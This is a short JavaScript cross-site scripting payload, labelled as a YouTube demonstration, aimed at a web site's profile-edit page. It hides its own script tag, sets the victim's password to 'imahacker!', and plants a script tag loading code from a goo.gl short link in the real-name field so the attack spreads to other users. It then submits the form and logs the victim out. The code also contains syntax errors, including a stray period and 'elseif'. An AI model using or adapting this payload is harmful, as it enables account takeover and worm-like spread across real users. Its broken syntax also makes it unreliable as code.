//a youtube demonstration payload that can change the users password to whatever you please
var src = document.currentScript.src.

var oldHtml = document.body.innerHTML;

var newHtml = oldHtml.slice(0, oldHtml.indexOf("<script src="+src+">"));//the first argument of slice is the start position (index 0), but the second is how MANY characters

document.body.innerHTML = newHtml + oldHtml.slice( newHtml.length + ("<script src="+src+">").length );
//now we do the payload: change their password, and steal their account!
var passInputs;

if (location.href == document.querySelector('.welcome-edit-link').href) {
  passInputs = document.querySelectorAll("input[type=password]");
  passInputs[0].value = "imahacker!";
  passInputs[1].value = "imahacker!";
  document.querySelector("#edit-profile-main-field-real-name-und-0-value").value = "<script/src=//goo.gl/gPZ5Dv>";
  jQuery.cookie("logout", true);
  document.querySelector("form")[1].submit();
} elseif (jQuery.cookie("logout")) {
  location.pathname = "/user/logout";
} else {
  location.href = document.querySelector('.welcome-edit-link').href;
};
